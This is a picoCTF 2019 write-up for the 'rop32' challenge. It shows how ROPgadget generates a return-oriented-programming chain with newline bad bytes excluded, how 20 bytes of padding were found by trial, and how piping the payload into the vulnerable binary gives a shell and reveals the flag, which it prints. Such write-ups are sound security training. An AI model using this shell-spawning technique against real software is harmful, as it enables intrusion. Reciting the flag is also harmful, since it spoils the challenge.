# rop32
#### Can you exploit the following [program](https://2019shell1.picoctf.com/static/c0091019426d9188e6791d4920a20ee2/vuln) to get a flag? You can find the program in /problems/rop32_3_f3a10b5fa410146f5328fb7b3e63e7c0 on the shell server. Source.

I solved this after the competition ended.

We can use an automatic tool to solve rop problems. Running ROpgadget with the following command
```
ROPgadget --binary ./vuln --ropchain --badbytes "0a"
```
Results in a python script that generates our payload. We set badbytes to '0a' because our shellcode breaks when it is contained in it.
We still have to figure out the padding, I tried out values until I didn't get a segmentation fault. The right amount of padding was 20 bytes.
Running the following command with rop.py, which is contained in the file above, results in the flag.
```
Supermac30@pico-2019-shell1:/problems/rop32_3_f3a10b5fa410146f5328fb7b3e63e7c0$ (python ~/rop.py;cat) | ./vuln
Can you ROP your way out of this one?
cat flag.txt
picoCTF{rOp_t0_b1n_sH_cb4c373e}
```

Flag: picoCTF{rOp_t0_b1n_sH_cb4c373e}
